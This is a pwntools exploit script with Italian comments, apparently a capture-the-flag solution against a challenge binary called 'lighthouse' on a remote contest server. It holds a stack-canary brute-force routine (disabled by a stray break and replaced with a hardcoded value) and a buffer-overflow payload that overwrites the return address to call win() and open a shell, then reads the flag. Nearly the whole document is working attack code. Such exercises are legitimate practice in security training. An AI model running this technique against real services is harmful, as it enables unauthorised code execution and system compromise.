#!/usr/bin/env python3
from pwn import *

# Parametri forniti
OFFSET_TO_CANARY = 136
OFFSET_TO_RIP = OFFSET_TO_CANARY + 16 # Canary(8) + RBP(8)
ret_gadget = 0x40101a
win_addr = 0x401630

HOST, PORT = 'offsec.m0lecon.it', 13578
# canary for this instance: 0x8392adae9215300

elf = ELF('./lighthouse', checksec=False)
context.log_level = 'info'

# --- FASE 1: BRUTE-FORCE DEL CANARY ---
known_canary = b"\x00"  # Il primo byte è sempre 0x00

log.info("Inizio brute-force del Canary (8 byte)...")

for i in range(7):
    break
    for bval in range(256):
        io = remote(HOST, PORT, level='error')
        try:
            io.recvuntil(b"> ")
            io.sendline(b"1") # Entriamo in vuln()
            io.recvuntil(b"entry: ")

            # Testiamo il byte successivo
            guess = known_canary + bytes([bval])
            payload = b"A" * OFFSET_TO_CANARY + guess
            
            io.send(payload) # Usiamo send per non aggiungere \n indesiderati
            
            # Se il canary è corretto, leggiamo il messaggio di successo
            # Se è sbagliato, il server chiude la connessione (EOF)
            response = io.recvall(timeout=0.2)
            
            if b"Log entry recorded" in response:
                known_canary = guess
                log.success(f"Trovato byte {i+1}/7: {hex(bval)}")
                io.close()
                break
            
            io.close()
        except EOFError:
            io.close()
            continue

#canary_val = u64(known_canary.ljust(8, b"\x00"))
#canary = u64(known_canary)
canary = 0x8392adae9215300
log.success(f"Canary completo: {canary:#x}")

# --- FASE 2: EXPLOIT FINALE ---
log.info("Lancio dell'exploit finale...")

io = remote(HOST,PORT)
io.recvuntil(b"> ")
io.sendline(b"1")
io.recvuntil(b"entry: ")

payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * 8,      # Sovrascriviamo RBP
    p64(ret_gadget),    # Allineamento stack (16-byte alignment per system)
    p64(win_addr),       # Indirizzo di win()
)

io.send(payload)
log.success("Payload inviato! Dovresti avere una shell.")

sleep(0.5)
io.sendline(b'cat /home/user/flag')

io.interactive()